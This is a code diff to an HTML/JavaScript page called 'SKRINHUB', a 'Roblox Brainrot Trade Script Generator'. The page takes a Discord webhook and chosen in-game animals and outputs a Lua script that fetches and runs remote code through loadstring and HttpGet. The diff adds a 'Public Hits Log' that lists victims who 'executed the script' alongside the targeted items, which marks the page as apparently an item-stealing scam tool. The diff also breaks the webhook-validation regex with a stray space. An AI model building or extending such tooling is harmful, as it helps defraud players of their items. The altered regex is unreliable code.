@@ -55,8 +55,7 @@
   }
 
   @keyframes float {
-    0% { transform: translate(0, 0);
-  }
+    0% { transform: translate(0, 0); }
     100% { transform: translate(100px, 100px); }
   }
 
@@ -243,11 +242,9 @@
 
   .panel:nth-child(1) { animation-delay: 0.05s; }
   .panel:nth-child(2) { animation-delay: 0.13s; }
-  .panel:nth-child(3) { animation-delay: 0.21s;
-  }
+  .panel:nth-child(3) { animation-delay: 0.21s; }
   .panel:nth-child(4) { animation-delay: 0.29s; }
-  .panel:nth-child(5) { animation-delay: 0.37s;
-  }
+  .panel:nth-child(5) { animation-delay: 0.37s; }
 
   .ph {
     display: flex;
@@ -268,11 +265,10 @@
   }
 
   .dot-cyan { background: var(--neon); }
-  .dot-purple { background: var(--neon); animation-delay: 0.4s;
-  }
+  .dot-purple { background: var(--neon); animation-delay: 0.4s; }
   .dot-discord { background: var(--neon); animation-delay: 0.8s; }
-  .dot-green { background: var(--green); animation-delay: 1.2s;
-  }
+  .dot-green { background: var(--green); animation-delay: 1.2s; }
+  .dot-danger { background: var(--danger); }
 
   .ph-title {
     font-family: 'Share Tech Mono', monospace;
@@ -380,11 +376,9 @@
     user-select: none;
   }
 
-  .a-item:last-child { border-bottom: none;
-  }
+  .a-item:last-child { border-bottom: none; }
   .a-item:hover { background: rgba(255, 255, 255, 0.05); }
-  .a-item.on { background: rgba(255, 255, 255, 0.1);
-  }
+  .a-item.on { background: rgba(255, 255, 255, 0.1); }
 
   .a-item input[type="checkbox"] {
     -webkit-appearance: none;
@@ -466,8 +460,7 @@
     box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
   }
 
-  .txt::placeholder { color: var(--muted);
-  }
+  .txt::placeholder { color: var(--muted); }
 
   .hint {
     font-family: 'Share Tech Mono', monospace;
@@ -569,23 +562,41 @@
     white-space: pre-wrap;
   }
 
+  /* NEW PUBLIC HITS LOG STYLING */
+  .hits-list {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    height: 140px;
+    overflow-y: auto;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.8rem;
+    padding: 0.5rem;
+    scrollbar-width: thin;
+    scrollbar-color: var(--danger) transparent;
+  }
+  .hit-item {
+    padding: 6px 10px;
+    border-bottom: 1px solid rgba(255, 68, 68, 0.05);
+    line-height: 1.4;
+    animation: fadeDown 0.3s ease both;
+  }
+  .hit-time { color: var(--muted); margin-right: 8px; }
+  .hit-user { color: var(--green); font-weight: 600; }
+  .hit-owns { color: var(--danger); }
+
   @keyframes fadeDown {
-    from { opacity: 0; transform: translateY(-16px);
-  }
-    to { opacity: 1; transform: none;
-  }
+    from { opacity: 0; transform: translateY(-16px); }
+    to { opacity: 1; transform: none; }
   }
 
   @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(16px);
-  }
-    to { opacity: 1; transform: none;
-  }
+    from { opacity: 0; transform: translateY(16px); }
+    to { opacity: 1; transform: none; }
   }
 
   @keyframes blink {
-    0%, 100% { opacity: 1;
-  }
+    0%, 100% { opacity: 1; }
     50% { opacity: 0.3; }
   }
 
@@ -707,6 +718,15 @@
     <div class="logo-row"><h1>SKRINHUB</h1></div>
     <p class="tagline">Roblox • Brainrot • Trade Script Generator</p>
   </header>
+
+  <div class="panel">
+    <div class="ph"><div class="dot dot-danger"></div><span class="ph-title">Public Hits Log</span></div>
+    <div class="pb">
+      <div class="hits-list" id="publicHitsLog">
+        <div class="hit-item" style="color: var(--muted); text-align: center; padding-top: 2.5rem;">Awaiting incoming executions...</div>
+      </div>
+    </div>
+  </div>
 
   <div class="panel">
     <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
@@ -897,56 +917,56 @@ const ANIMALS = [
 { name: "Money Money Reindeer", rarity: "Secret", mps: "25M/s" },
 { name: "La Spooky Grande", rarity: "Secret", mps: "24.5M/s" },
 { name: "Bacuru and Egguru", rarity: "Secret", mps: "24M/s" },
-{ name: "Los Bros", rarity: "Secret", mps: "24M/s" },
-{ name: "La Extinct Grande", rarity: "Secret", mps: "23.5M/s" },
-{ name: "Los Candies", rarity: "Secret", mps: "23M/s" },
-{ name: "Los 67", rarity: "Secret", mps: "22.5M/s" },
-{ name: "Celularcini Viciosini", rarity: "Secret", mps: "22.5M/s" },
-{ name: "Los Mobilis", rarity: "Secret", mps: "22M/s" },
-{ name: "Churrito Bunnito", rarity: "Secret", mps: "21M/s" },
-{ name: "Money Money Puggy", rarity: "Secret", mps: "21M/s" },
-{ name: "Cigno Fulgoro", rarity: "Secret", mps: "20M/s" },
-{ name: "Los Spooky Combinasionas", rarity: "Secret", mps: "20M/s" },
-{ name: "Los Hotspotsitos", rarity: "Secret", mps: "20M/s" },
-{ name: "Los Jolly Combinasionas", rarity: "Secret", mps: "20M/s" },
-{ name: "Snailo Clovero", rarity: "Secret", mps: "18.5M/s" },
-{ name: "Los Planitos", rarity: "Secret", mps: "18.5M/s" },
-{ name: "Chicleteira Cupideira", rarity: "Secret", mps: "17.5M/s" },
-{ name: "DJ Panda", rarity: "Secret", mps: "17.5M/s" },
-{ name: "Las Sis", rarity: "Secret", mps: "17.5M/s" },
-{ name: "Camera Ramena", rarity: "Secret", mps: "17M/s" },
-{ name: "Spinny Hammy", rarity: "Secret", mps: "17M/s" },
-{ name: "Tacorita Bicicleta", rarity: "Secret", mps: "16.5M/s" },
-{ name: "Los Sweethearts", rarity: "Secret", mps: "16.5M/s" },
-{ name: "Baskito", rarity: "Secret", mps: "16M/s" },
-{ name: "Nuclearo Dinossauro", rarity: "Secret", mps: "15M/s" },
-{ name: "Chicleteira Noelteira", rarity: "Secret", mps: "15M/s" },
-{ name: "Los Combinasionas", rarity: "Secret", mps: "15M/s" },
-{ name: "Bananito", rarity: "Secret", mps: "15M/s" },
-{ name: "Chimnino", rarity: "Secret", mps: "14M/s" },
-{ name: "Noo my Gold", rarity: "Secret", mps: "13.5M/s" },
-{ name: "Swag Soda", rarity: "Secret", mps: "13M/s" },
-{ name: "Noo my Heart", rarity: "Secret", mps: "13M/s" },
-{ name: "Tacorillo Crocodillo", rarity: "Secret", mps: "12.5M/s" },
-{ name: "Mariachi Corazoni", rarity: "Secret", mps: "12.5M/s" },
-{ name: "La Grande Combinasion", rarity: "Secret", mps: "10M/s" },
-{ name: "Los 25", rarity: "Secret", mps: "10M/s" },
-{ name: "Los Burritos", rarity: "Secret", mps: "8.5M/s" },
-{ name: "67", rarity: "Secret", mps: "7.5M/s" },
-{ name: "Donkeyturbo Express", rarity: "Secret", mps: "7.5M/s" },
-{ name: "John Doe", rarity: "Secret", mps: "7.5M/s" },
-{ name: "Los Chicleteiras", rarity: "Secret", mps: "7M/s" },
-{ name: "Noo my Eggs", rarity: "Secret", mps: "7M/s" },
-{ name: "Strawberrita", rarity: "Secret", mps: "6.5M/s" },
-{ name: "Los Mi Gatitos", rarity: "Secret", mps: "6.5M/s" },
-{ name: "Spooky Skeleton", rarity: "Secret", mps: "6M/s" },
-{ name: "Aero 67", rarity: "Secret", mps: "5.5M/s" },
-{ name: "Chicleteira Bunnyteira", rarity: "Secret", mps: "5.5M/s" },
-{ name: "Dino 67", rarity: "Secret", mps: "5.5M/s" },
-{ name: "Cloverat Express", rarity: "Secret", mps: "5.5M/s" },
-{ name: "Bao Sahur", rarity: "Secret", mps: "5M/s" },
-{ name: "Laternini Corazoni", rarity: "Secret", mps: "5M/s" },
-{ name: "Mimi", rarity: "Secret", mps: "5M/s" }
+		{ name: "Los Bros", rarity: "Secret", mps: "24M/s" },
+		{ name: "La Extinct Grande", rarity: "Secret", mps: "23.5M/s" },
+		{ name: "Los Candies", rarity: "Secret", mps: "23M/s" },
+		{ name: "Los 67", rarity: "Secret", mps: "22.5M/s" },
+		{ name: "Celularcini Viciosini", rarity: "Secret", mps: "22.5M/s" },
+		{ name: "Los Mobilis", rarity: "Secret", mps: "22M/s" },
+		{ name: "Churrito Bunnito", rarity: "Secret", mps: "21M/s" },
+		{ name: "Money Money Puggy", rarity: "Secret", mps: "21M/s" },
+		{ name: "Cigno Fulgoro", rarity: "Secret", mps: "20M/s" },
+		{ name: "Los Spooky Combinasionas", rarity: "Secret", mps: "20M/s" },
+		{ name: "Los Hotspotsitos", rarity: "Secret", mps: "20M/s" },
+		{ name: "Los Jolly Combinasionas", rarity: "Secret", mps: "20M/s" },
+		{ name: "Snailo Clovero", rarity: "Secret", mps: "18.5M/s" },
+		{ name: "Los Planitos", rarity: "Secret", mps: "18.5M/s" },
+		{ name: "Chicleteira Cupideira", rarity: "Secret", mps: "17.5M/s" },
+		{ name: "DJ Panda", rarity: "Secret", mps: "17.5M/s" },
+		{ name: "Las Sis", rarity: "Secret", mps: "17.5M/s" },
+		{ name: "Camera Ramena", rarity: "Secret", mps: "17M/s" },
+		{ name: "Spinny Hammy", rarity: "Secret", mps: "17M/s" },
+		{ name: "Tacorita Bicicleta", rarity: "Secret", mps: "16.5M/s" },
+		{ name: "Los Sweethearts", rarity: "Secret", mps: "16.5M/s" },
+		{ name: "Baskito", rarity: "Secret", mps: "16M/s" },
+		{ name: "Nuclearo Dinossauro", rarity: "Secret", mps: "15M/s" },
+		{ name: "Chicleteira Noelteira", rarity: "Secret", mps: "15M/s" },
+		{ name: "Los Combinasionas", rarity: "Secret", mps: "15M/s" },
+		{ name: "Bananito", rarity: "Secret", mps: "15M/s" },
+		{ name: "Chimnino", rarity: "Secret", mps: "14M/s" },
+		{ name: "Noo my Gold", rarity: "Secret", mps: "13.5M/s" },
+		{ name: "Swag Soda", rarity: "Secret", mps: "13M/s" },
+		{ name: "Noo my Heart", rarity: "Secret", mps: "13M/s" },
+		{ name: "Tacorillo Crocodillo", rarity: "Secret", mps: "12.5M/s" },
+		{ name: "Mariachi Corazoni", rarity: "Secret", mps: "12.5M/s" },
+		{ name: "La Grande Combinasion", rarity: "Secret", mps: "10M/s" },
+		{ name: "Los 25", rarity: "Secret", mps: "10M/s" },
+		{ name: "Los Burritos", rarity: "Secret", mps: "8.5M/s" },
+		{ name: "67", rarity: "Secret", mps: "7.5M/s" },
+		{ name: "Donkeyturbo Express", rarity: "Secret", mps: "7.5M/s" },
+		{ name: "John Doe", rarity: "Secret", mps: "7.5M/s" },
+		{ name: "Los Chicleteiras", rarity: "Secret", mps: "7M/s" },
+		{ name: "Noo my Eggs", rarity: "Secret", mps: "7M/s" },
+		{ name: "Strawberrita", rarity: "Secret", mps: "6.5M/s" },
+		{ name: "Los Mi Gatitos", rarity: "Secret", mps: "6.5M/s" },
+		{ name: "Spooky Skeleton", rarity: "Secret", mps: "6M/s" },
+		{ name: "Aero 67", rarity: "Secret", mps: "5.5M/s" },
+		{ name: "Chicleteira Bunnyteira", rarity: "Secret", mps: "5.5M/s" },
+		{ name: "Dino 67", rarity: "Secret", mps: "5.5M/s" },
+		{ name: "Cloverat Express", rarity: "Secret", mps: "5.5M/s" },
+		{ name: "Bao Sahur", rarity: "Secret", mps: "5M/s" },
+		{ name: "Laternini Corazoni", rarity: "Secret", mps: "5M/s" },
+		{ name: "Mimi", rarity: "Secret", mps: "5M/s" }
 ];
 
 let selectedAnimals = new Set();
@@ -1207,7 +1227,7 @@ function validateWebhook() {
         hint.textContent = 'Paste your Discord webhook (must start with https://discord.com/api/webhooks/).';
         return false;
     }
-    const webhookRegex = /^https:\/\\/discord\.com\\/api\\/webhooks\\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
+    const webhookRegex = /^https:\/\ /discord\.com\/api\/webhooks\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
     if (!webhookRegex.test(webhook)) {
         hint.classList.add('error');
         hint.textContent = 'Invalid webhook format. Must be: https://discord.com/api/webhooks/<ID>/<TOKEN>';
@@ -1242,6 +1262,30 @@ function copyOut() {
         btn.textContent = '⧉ Copy';
         btn.classList.remove('ok');
     }, 2000);
+}
+
+/* NEW FUNCTION TO HANDLE UPDATING THE PUBLIC HITS DISPLAY */
+function pushPublicHitLog(username, animals) {
+    const logContainer = document.getElementById('publicHitsLog');
+    
+    // Remove placeholder element on first initialization
+    if (logContainer.querySelector('.hit-item') && logContainer.querySelector('.hit-item').textContent.includes("Awaiting")) {
+        logContainer.innerHTML = '';
+    }
+    
+    const now = new Date();
+    const timeString = now.toTimeString().split(' ')[0];
+    const formattedAnimals = animals.length > 0 ? animals.join(', ') : 'None';
+
+    const item = document.createElement('div');
+    item.className = 'hit-item';
+    item.innerHTML = `
+        <span class="hit-time">[${timeString}]</span>
+        <span class="hit-user">${username}</span> executed the script. 
+        <span class="hit-owns">Target selection matches: [${formattedAnimals}]</span>
+    `;
+    
+    logContainer.insertBefore(item, logContainer.firstChild);
 }
 
 function generate() {
@@ -1290,6 +1334,9 @@ ${modeScript ? modeScript + '\n' : ''}loadstring(game:HttpGet("https://raw.githu
 
     outputBlock.textContent = scriptText;
     outputBlock.classList.remove('empty');
+    
+    // Trigger the dynamic tracking UI update inside your function
+    pushPublicHitLog(username, Array.from(selectedAnimals));
 }
 </script>
 </body>
